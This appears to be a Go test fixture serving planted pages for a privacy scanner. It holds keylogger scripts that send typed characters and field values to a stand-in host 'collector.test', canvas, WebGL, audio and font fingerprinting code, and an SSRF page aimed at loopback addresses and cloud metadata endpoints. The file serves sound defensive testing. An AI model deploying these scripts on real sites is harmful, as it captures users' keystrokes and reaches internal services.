//go:build nosytest

package testsite

import (
	"fmt"
	"net"
	"net/http"
	"strings"
	"time"
)

const controlJS = `(function () {
  // chart-style canvas: two colours, save and restore, read back
  var a = document.createElement('canvas'); a.width = 200; a.height = 100;
  var x = a.getContext('2d'); x.save();
  x.fillStyle = '#c00'; x.fillRect(0, 0, 50, 50); x.fillStyle = '#00c'; x.fillRect(50, 0, 50, 50);
  x.restore(); a.toDataURL();
  // a short label in one colour, read back
  var b = document.createElement('canvas'); b.width = 200; b.height = 50;
  var y = b.getContext('2d'); y.fillStyle = '#000'; y.fillText('Hello', 5, 20); b.toDataURL();
  // a tiny canvas with a lot drawn on it
  var t = document.createElement('canvas'); t.width = 8; t.height = 8;
  var z = t.getContext('2d'); z.fillStyle = 'red'; z.fillRect(0, 0, 4, 4); z.fillStyle = 'blue';
  z.fillText('abcdefghijklmnop', 0, 4); t.toDataURL();
  // webgl: version and limits only
  var g = document.createElement('canvas').getContext('webgl');
  if (g) { g.getParameter(g.VERSION); g.getParameter(g.MAX_TEXTURE_SIZE); }
  // audio: a live context, and an offline render nobody reads
  try { new (window.AudioContext || window.webkitAudioContext)(); } catch (e) {}
  var oc = new OfflineAudioContext(1, 4410, 44100), o = oc.createOscillator();
  o.connect(oc.destination); o.start(0); oc.startRendering();
  // a handful of font measurements
  var m = document.createElement('canvas').getContext('2d');
  ['Arial', 'Times', 'Courier', 'Verdana', 'Georgia'].forEach(function (f) { m.font = '16px ' + f; m.measureText('hello'); });
  document.cookie = 'theme=dark; max-age=3600; path=/';
})();`

const canvasJS = `(function () {
  var c = document.createElement('canvas'); c.width = 240; c.height = 60;
  var x = c.getContext('2d'); x.textBaseline = 'top'; x.font = '14px Arial';
  x.fillStyle = '#f60'; x.fillRect(125, 1, 62, 20);
  x.fillStyle = '#069'; x.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
  x.fillStyle = 'rgba(102, 204, 0, 0.7)'; x.fillText('Cwm fjordbank glyphs vext quiz', 4, 17);
  window.__fp = c.toDataURL();
})();`

const webglJS = `(function () {
  var gl = document.createElement('canvas').getContext('webgl');
  if (!gl) { window.__nogl = true; return; }
  var e = gl.getExtension('WEBGL_debug_renderer_info');
  window.__fp = e ? gl.getParameter(e.UNMASKED_RENDERER_WEBGL) : '';
})();`

const audioJS = `(function () {
  var ctx = new OfflineAudioContext(1, 44100, 44100);
  var o = ctx.createOscillator(); o.type = 'triangle'; o.frequency.value = 10000;
  var c = ctx.createDynamicsCompressor(); o.connect(c); c.connect(ctx.destination); o.start(0);
  ctx.startRendering().then(function (b) { var d = b.getChannelData(0), s = 0; for (var i = 0; i < d.length; i++) s += Math.abs(d[i]); window.__fp = s; });
})();`

const fontsJS = `(function () {
  var x = document.createElement('canvas').getContext('2d');
  for (var i = 0; i < 60; i++) { x.font = '72px "Nosy Font ' + i + '", monospace'; x.measureText('mmmmmmmmmmlli'); }
})();`

const fontsDomJS = `(function () {
  var s = document.createElement('span'); s.textContent = 'mmmmmmmmmmlli'; s.style.position = 'absolute'; s.style.visibility = 'hidden';
  document.body.appendChild(s);
  for (var i = 0; i < 60; i++) { s.style.fontFamily = '"Nosy Font ' + i + '", monospace'; void s.offsetWidth; }
})();`

// logs every typed character as it is typed, from key events
const keydownJS = `var nosyBuf = '';
document.addEventListener('keydown', function (e) {
  if (e.key && e.key.length === 1) {
    nosyBuf += e.key;
    fetch('http://collector.test/k?b=' + encodeURIComponent(nosyBuf), { mode: 'no-cors' });
  }
}, true);`

// sends the field's value when the field changes
const inputJS = `document.addEventListener('input', function (e) {
  var v = e.target.value;
  if (v) navigator.sendBeacon('http://collector.test/c', v);
}, true);`

const inputB64JS = `document.addEventListener('input', function (e) {
  var v = e.target.value;
  if (v) fetch('http://collector.test/b', { method: 'POST', mode: 'no-cors', body: btoa(v) });
}, true);`

// writes one of every kind of storage, from the first-party page
const storeJS = `(async function () {
  localStorage.setItem('uid', '9f86d081884c7d659a2feaa0c55ad015');
  localStorage.setItem('theme', 'dark');
  sessionStorage.setItem('tab', 'a1b2c3d4e5f6a7b8c9d0e1f2');
  await new Promise(function (done) {
    var r = indexedDB.open('appdb', 3);
    r.onupgradeneeded = function () {
      var db = r.result;
      var items = db.createObjectStore('items', { keyPath: 'id' });
      items.add({ id: 'one', visitor: '3f2b8a4e-9c1d-4e7a-b2f0-6d5a1c8e9b73', n: 1 });
      items.add({ id: 'two', n: 2 });
      db.createObjectStore('prefs');
    };
    r.onsuccess = function () { r.result.close(); done(); };
    r.onerror = done;
  });
  var c = await caches.open('v1');
  await c.put('/asset.txt', new Response('x'));
  await navigator.serviceWorker.register('/sw.js');
})();`

// the same from a third-party frame
const tpStoreJS = `(async function () {
  localStorage.setItem('tpid', '5d41402abc4b2a76b9719d911017c592');
  sessionStorage.setItem('tpsession', 'x');
  await new Promise(function (done) {
    var r = indexedDB.open('tpdb', 1);
    r.onupgradeneeded = function () { r.result.createObjectStore('events').add('b6d767d2f8ed5d21a44b0e5886680cb9', 'first'); };
    r.onsuccess = function () { r.result.close(); done(); };
    r.onerror = done;
  });
  await (await caches.open('tpcache')).put('/a', new Response('x'));
})();`

func scriptTag(src string) string { return `<script src="` + src + `"></script>` }

func (s *Site) route(host string) (http.HandlerFunc, bool) {
	pages := map[string]http.HandlerFunc{
		// the clean control: every benign look-alike of a planted behaviour
		"control.test": func(w http.ResponseWriter, r *http.Request) {
			switch r.URL.Path {
			case "/app.js":
				script(w, controlJS)
				return
			case "/style.css":
				w.Header().Set("Content-Type", "text/css")
				fmt.Fprint(w, "body { font-family: sans-serif; }")
				return
			}
			http.SetCookie(w, &http.Cookie{Name: "sid", Value: "0a1b2c3d4e5f60718293a4b5c6d7e8f9", Path: "/"})
			html(w, 200, page("Control page", `<link rel="stylesheet" href="/style.css">`+
				`<img alt="" width="1" height="1" src="http://assets.ownco.test/logo.gif">`+
				scriptTag("http://cdn.test/lib.js")+
				`<form><label>Search <input type="search" name="q"></label></form>`+scriptTag("/app.js")))
		},
		// sets every kind of browser storage, and frames a third party that does the same
		"store.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/sw.js" {
				w.Header().Set("Service-Worker-Allowed", "/")
				script(w, "self.addEventListener('install', function () { self.skipWaiting(); });")
				return
			}
			html(w, 200, page("Storage plant", `<script>`+storeJS+`</script><iframe src="https://tpstore.test/inner" width="300" height="100"></iframe>`))
		},
		"tpstore.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, `<!doctype html><html><head><title>Third-party storage</title></head><body><script>`+tpStoreJS+`</script></body></html>`)
		},
		// the control: reads storage and caches nothing, writes nothing
		"nostore.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Storage control", `<script>void localStorage.length; void sessionStorage.length; void indexedDB; void navigator.serviceWorker;</script>`))
		},
		// reports how the browser presented itself, to the server and to the page's own script
		"env.test": func(w http.ResponseWriter, r *http.Request) {
			s.mu.Lock()
			s.envHits = append(s.envHits, EnvHit{Path: r.URL.Path, Query: r.URL.RawQuery, GPCHeader: r.Header.Get("Sec-GPC"), UserAgent: r.UserAgent()})
			s.mu.Unlock()
			if r.URL.Path == "/report" {
				noContent(w, r)
				return
			}
			html(w, 200, strings.Replace(page("Environment probe", `<script>fetch('/report?width=' + innerWidth + '&touch=' + ('ontouchstart' in window) + '&gpc=' + navigator.globalPrivacyControl + '&mobile=' + (navigator.userAgentData ? navigator.userAgentData.mobile : 'na') + '&ratio=' + devicePixelRatio);</script>`),
				`<meta charset="utf-8">`, `<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">`, 1))
		},
		"canvas.test":   vendorPage("Canvas plant", "http://fpvendor.test/canvas.js"),
		"webgl.test":    vendorPage("WebGL plant", "http://fpvendor.test/webgl.js"),
		"audio.test":    vendorPage("Audio plant", "http://fpvendor.test/audio.js"),
		"fonts.test":    vendorPage("Fonts plant", "http://fpvendor.test/fonts.js"),
		"fontsdom.test": vendorPage("Fonts in the page plant", "http://fpvendor.test/fontsdom.js"),
		"frames.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Frame plant", `<iframe src="http://frame.test/inner" width="300" height="100"></iframe>`))
		},
		"frame.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Inside the frame", `<img alt="" src="http://ads.test/px.gif">`+scriptTag("http://fpvendor.test/canvas.js")))
		},
		"keyinput.test": keyPage("Typed text plant, input events", "http://keylog.test/input.js"),
		"keydown.test":  keyPage("Typed text plant, key events", "http://keylog.test/keydown.js"),
		"keyb64.test":   keyPage("Typed text plant, Base64", "http://keylog.test/input-b64.js"),
		"keyfirst.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/s.js" {
				script(w, `document.addEventListener('input', function (e) { fetch('/suggest?q=' + encodeURIComponent(e.target.value)); }, true);`)
				return
			}
			if r.URL.Path == "/suggest" {
				noContent(w, r)
				return
			}
			html(w, 200, page("Own search suggestions", `<form><input type="search" name="q"></form>`+scriptTag("/s.js")))
		},
		"keysubmit.test": keyPage("Typed text control, sent only on submit", "/submit.js"),
		"addonmain.test": vendorPage("Add-on main tag plant", "http://addon.test/main.js"),
		"addonrec.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Add-on recorder plant", scriptTag("http://addon.test/main.js")+scriptTag("http://addon.test/recorder.js")))
		},
		"labelled.test": vendorPage("Replay label on a shared hostname", "http://shared-cdn.test/lib.js"),
		"cdntrack.test": vendorPage("CDN-labelled domain, blocklisted path", "http://shared-cdn.test/collect"),
		"addon.test":    func(w http.ResponseWriter, r *http.Request) { script(w, "window.__addon = 1;") },
		"replay.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Session replay plant", scriptTag("http://replayvendor.test/recorder.js")+scriptTag("http://stats.test/a.js")))
		},
		"worker.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/w.js" {
				// requests made from a web worker the moment it starts
				script(w, `(function () {
  fetch('http://ads.test/px.gif', { mode: 'no-cors' });
  fetch('http://stats.test/collect', { mode: 'no-cors' });
})();`)
				return
			}
			html(w, 200, page("Worker plant", `<script>new Worker('/w.js');</script>`))
		},
		"shared.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/w.js" {
				script(w, `onconnect = function () { (function () {
  fetch('http://ads.test/px.gif', { mode: 'no-cors' });
  fetch('http://stats.test/collect', { mode: 'no-cors' });
})(); };`)
				return
			}
			html(w, 200, page("Shared worker plant", `<script>new SharedWorker('/w.js');</script>`))
		},
		"sw.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/sw.js" {
				w.Header().Set("Service-Worker-Allowed", "/")
				script(w, `self.addEventListener('activate', function (e) { e.waitUntil(new Promise(function (done) { setTimeout(function () {
  Promise.all([fetch('https://ads.test/px.gif', { mode: 'no-cors' }), fetch('https://stats.test/collect', { mode: 'no-cors' })]).then(done, done);
}, 800); })); });`)
				return
			}
			html(w, 200, page("Service worker plant", `<script>navigator.serviceWorker.register('/sw.js');</script>`))
		},
		"orb.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Answer blocked by the browser", scriptTag("http://ads.test/data.json")))
		},
		"trackers.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Trackers plant",
				`<img alt="" src="http://ads.test/px.gif">`+scriptTag("http://ads.test/ad.js")+
					scriptTag("http://stats.test/a.js")+scriptTag("http://social.test/share.js")+
					scriptTag("http://cdn.test/lib.js")+`<img alt="" src="http://unlisted.test/x.gif">`+
					`<img alt="" src="http://assets.ownco.test/logo.gif">`))
		},
		"cookies.test": func(w http.ResponseWriter, r *http.Request) {
			for _, c := range []string{
				"uid=9f86d081884c7d659a2feaa0c55ad015; Max-Age=31536000; Path=/",
				"_ga=GA1.2.123456789.1712345678; Max-Age=63072000; Path=/",
				"vid=3f2b8a4e-9c1d-4e7a-b2f0-6d5a1c8e9b73; Max-Age=31536000; Path=/",
				"sess=abcdef0123456789abcdef; Path=/",
				"short=ab12; Max-Age=31536000; Path=/",
				"consent=accepted-all; Max-Age=31536000; Path=/",
				"recent=9f86d081884c7d659a2feaa0c55ad015; Max-Age=3600; Path=/",
				"settings=a=1&b=2&c=3&d=4; Max-Age=31536000; Path=/",
			} {
				w.Header().Add("Set-Cookie", c)
			}
			html(w, 200, page("Cookies plant", `<img alt="" src="https://tpcookie.test/px.gif">`+
				`<script>document.cookie='_fbp=fb.1.1712345678.1234567890; max-age=7776000; path=/';</script>`))
		},
		"tpcookie.test": func(w http.ResponseWriter, r *http.Request) {
			w.Header().Add("Set-Cookie", "tid=5d41402abc4b2a76b9719d911017c592; Max-Age=31536000; Path=/; Secure; SameSite=None")
			pixel(w, r)
		},
		"consent.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Consent plant", `<script>window.__tcfapi = function () {};</script>`+scriptTag("http://cmp.test/cmp.js")))
		},
		"tech.test": func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("X-Powered-By", "TestServer/1.2")
			html(w, 200, strings.Replace(page("Tech plant", `<div id="test-widget"></div>`+
				`<script>window.TestLib = { version: '3.1' };</script>`+scriptTag("http://cdn.test/testlib-3.1.js")),
				`<title>`, `<meta name="generator" content="TestGen 2.4"><title>`, 1))
		},
		"challenge.test": botCheck,
		"wall.test":      botCheck,
		"error.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 500, page("Internal Server Error", ""))
		},
		"notfound.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 404, page("Not Found", ""))
		},
		"empty.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, `<!doctype html><html><head></head><body></body></html>`)
		},
		// a bot wall that answers 200 with almost nothing and no outside request
		"thin.test": func(w http.ResponseWriter, r *http.Request) {
			http.SetCookie(w, &http.Cookie{Name: "bm_sz", Value: "A1B2C3D4E5F60718293A4B5C6D7E8F90", Path: "/"})
			html(w, 200, `<!doctype html><html><head><title>.</title></head><body><p>Loading...</p></body></html>`)
		},
		// more text than a nearly empty page, but only anti-bot cookies and no outside request
		"thincookie.test": func(w http.ResponseWriter, r *http.Request) {
			http.SetCookie(w, &http.Cookie{Name: "ak_bmsc", Value: "A1B2C3D4E5F60718293A4B5C6D7E8F90", Path: "/"})
			http.SetCookie(w, &http.Cookie{Name: "bm_sv", Value: "0F9E8D7C6B5A49382716051423324150", Path: "/"})
			html(w, 200, `<!doctype html><html><head><title>Please wait</title></head><body><main>`+filler(900)+`</main></body></html>`)
		},
		// a real page with no outside request, behind a bot manager: it stays scored
		"solo.test": func(w http.ResponseWriter, r *http.Request) {
			http.SetCookie(w, &http.Cookie{Name: "__cf_bm", Value: "A1B2C3D4E5F60718293A4B5C6D7E8F90", Path: "/"})
			html(w, 200, `<!doctype html><html><head><title>A site that keeps to itself</title></head><body><main>`+filler(2600)+`</main></body></html>`)
		},
		// thin on the first visit only
		"thinonce.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != "/" {
				http.NotFound(w, r)
				return
			}
			s.mu.Lock()
			first := s.counters["thinonce"] == 0
			s.counters["thinonce"]++
			s.mu.Unlock()
			if first {
				html(w, 200, `<!doctype html><html><head><title>.</title></head><body><p>Loading...</p></body></html>`)
				return
			}
			html(w, 200, page("Second visit", ""))
		},
		"redirect.test": func(w http.ResponseWriter, r *http.Request) {
			http.Redirect(w, r, "http://final.test/", http.StatusFound)
		},
		"final.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Where the redirect lands", ""))
		},
		"slow.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/ping" {
				noContent(w, r)
				return
			}
			html(w, 200, page("Never quiet", `<script>setInterval(function () { fetch('/ping?' + Date.now()); }, 400);</script>`))
		},
		"big.test": func(w http.ResponseWriter, r *http.Request) {
			html(w, 200, page("Big download", scriptTag("http://bigdata.test/huge.js")))
		},
		"bigdata.test": func(w http.ResponseWriter, r *http.Request) {
			// a script is downloaded in full before it runs, so the browser keeps reading
			w.Header().Set("Content-Type", "application/javascript")
			w.Write([]byte("/*"))
			buf := make([]byte, 64<<10)
			for i := 0; i < 4000; i++ {
				if _, err := w.Write(buf); err != nil {
					return
				}
			}
		},
		"down.test": func(w http.ResponseWriter, r *http.Request) {
			if hj, ok := w.(http.Hijacker); ok {
				if c, _, err := hj.Hijack(); err == nil {
					c.Close()
				}
			}
		},
		"hang.test": func(w http.ResponseWriter, r *http.Request) {
			select {
			case <-time.After(60 * time.Second):
			case <-r.Context().Done():
			}
		},
		"ssrf.test":      s.ssrfPage,
		"fw.test":        s.firewallPage,
		"topredir.test":  redirectTo("http://127.0.0.1/secret"),
		"topredir6.test": redirectTo("http://[::1]/secret"),
		"topmeta.test":   redirectTo("http://169.254.169.254/latest/meta-data/"),
		"subredir.test": func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/r" {
				http.Redirect(w, r, "http://169.254.169.254/latest/meta-data/", http.StatusFound)
				return
			}
			html(w, 200, page("Redirect to metadata as a subresource", `<img alt="" src="/r">`))
		},

		// third parties
		"fpvendor.test": func(w http.ResponseWriter, r *http.Request) {
			js := map[string]string{"/canvas.js": canvasJS, "/webgl.js": webglJS, "/audio.js": audioJS, "/fonts.js": fontsJS, "/fontsdom.js": fontsDomJS}[r.URL.Path]
			script(w, js)
		},
		"keylog.test": func(w http.ResponseWriter, r *http.Request) {
			js := map[string]string{"/input.js": inputJS, "/keydown.js": keydownJS, "/input-b64.js": inputB64JS}[r.URL.Path]
			script(w, js)
		},
		"collector.test":    noContent,
		"replayvendor.test": func(w http.ResponseWriter, r *http.Request) { script(w, "window.__replay = 1;") },
		"ads.test": func(w http.ResponseWriter, r *http.Request) {
			if strings.HasSuffix(r.URL.Path, ".json") {
				w.Header().Set("Content-Type", "application/json")
				fmt.Fprint(w, `{"ok": true}`)
				return
			}
			if strings.HasSuffix(r.URL.Path, ".js") {
				script(w, "window.__ad = 1;")
				return
			}
			pixel(w, r)
		},
		"stats.test":    func(w http.ResponseWriter, r *http.Request) { script(w, "window.__stats = 1;") },
		"social.test":   func(w http.ResponseWriter, r *http.Request) { script(w, "window.__social = 1;") },
		"cdn.test":      func(w http.ResponseWriter, r *http.Request) { script(w, "window.__cdn = 1;") },
		"cmp.test":      func(w http.ResponseWriter, r *http.Request) { script(w, "window.__cmp = 1;") },
		"unlisted.test": pixel,
		"ownco.test":    pixel,
	}
	for _, extra := range []map[string]http.HandlerFunc{s.chainPages(), s.leakPages(), s.statePages()} {
		for name, h := range extra {
			pages[name] = h
		}
	}
	for name, h := range pages {
		if host == name || strings.HasSuffix(host, "."+name) {
			return h, true
		}
	}
	return nil, false
}

func botCheck(w http.ResponseWriter, r *http.Request) {
	html(w, 403, `<!doctype html><title>Just a moment...</title><body><h1>Checking your browser before accessing the site.</h1></body>`)
}

func redirectTo(target string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, target, http.StatusFound) }
}

func vendorPage(title, src string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) { html(w, 200, page(title, scriptTag(src))) }
}

func keyPage(title, src string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/submit.js" {
			script(w, `document.getElementById('f').addEventListener('submit', function (e) {
  fetch('http://collector.test/s', { method: 'POST', mode: 'no-cors', body: document.getElementById('q').value });
});`)
			return
		}
		html(w, 200, page(title, `<form id="f"><label>Name <input type="text" id="q" name="q"></label> <label>Message <textarea name="m"></textarea></label></form>`+scriptTag(src)))
	}
}

func port(addr string) string {
	_, p, _ := net.SplitHostPort(addr)
	return p
}

// ssrfPage tries every way a page can make the browser reach a private
// address: elements, scripts, frames, fetch, WebSocket, and odd spellings
// of loopback.
func (s *Site) ssrfPage(w http.ResponseWriter, r *http.Request) {
	p := port(s.Canary.Addr)
	urls := []string{
		"http://127.0.0.1:" + p + "/canary",
		"http://localhost:" + p + "/canary",
		"http://[::1]:" + p + "/canary",
		"http://2130706433:" + p + "/canary",
		"http://0x7f.1:" + p + "/canary",
		"http://127.0.0.1/canary",
		"http://localhost/canary",
		"http://[::1]/canary",
		"http://[::ffff:127.0.0.1]/canary",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://[fd00:ec2::254]/latest/meta-data/",
		"http://10.0.0.5/x",
		"http://172.16.0.1/x",
		"http://192.168.1.1/x",
		"http://100.64.0.1/x",
		"https://127.0.0.1/canary",
		"https://169.254.169.254/latest/meta-data/",
		"https://10.0.0.5/x",
	}
	var b strings.Builder
	for i, u := range urls {
		switch i % 4 {
		case 0:
			fmt.Fprintf(&b, `<img alt="" src="%s">`, u)
		case 1:
			fmt.Fprintf(&b, `<script src="%s"></script>`, u)
		case 2:
			fmt.Fprintf(&b, `<link rel="stylesheet" href="%s">`, u)
		default:
			fmt.Fprintf(&b, `<iframe src="%s" width="10" height="10"></iframe>`, u)
		}
	}
	b.WriteString(`<script>`)
	for _, u := range urls {
		fmt.Fprintf(&b, "fetch(%q, {mode: 'no-cors'}).catch(function () {});\n", u)
		ws := strings.Replace(strings.Replace(u, "https://", "wss://", 1), "http://", "ws://", 1)
		fmt.Fprintf(&b, "try { new WebSocket(%q); } catch (e) {}\n", ws)
	}
	b.WriteString(`</script>`)
	html(w, 200, page("Private address plant", b.String()))
}

// SetTargets sets the addresses the fw.test page tries to reach; the
// firewall tests point them at hosts outside the scanner's network.
func (s *Site) SetTargets(urls []string) {
	s.mu.Lock()
	s.targets = urls
	s.mu.Unlock()
}

func (s *Site) firewallPage(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	urls := append([]string(nil), s.targets...)
	s.mu.Unlock()
	var b strings.Builder
	for i, u := range urls {
		switch i % 3 {
		case 0:
			fmt.Fprintf(&b, `<img alt="" src="%s">`, u)
		case 1:
			fmt.Fprintf(&b, `<script src="%s"></script>`, u)
		default:
			fmt.Fprintf(&b, `<iframe src="%s" width="10" height="10"></iframe>`, u)
		}
	}
	b.WriteString(`<script>`)
	for _, u := range urls {
		fmt.Fprintf(&b, "fetch(%q, {mode: 'no-cors'}).catch(function () {});\n", u)
	}
	b.WriteString(`</script>`)
	html(w, 200, page("Firewall plant", b.String()))
}
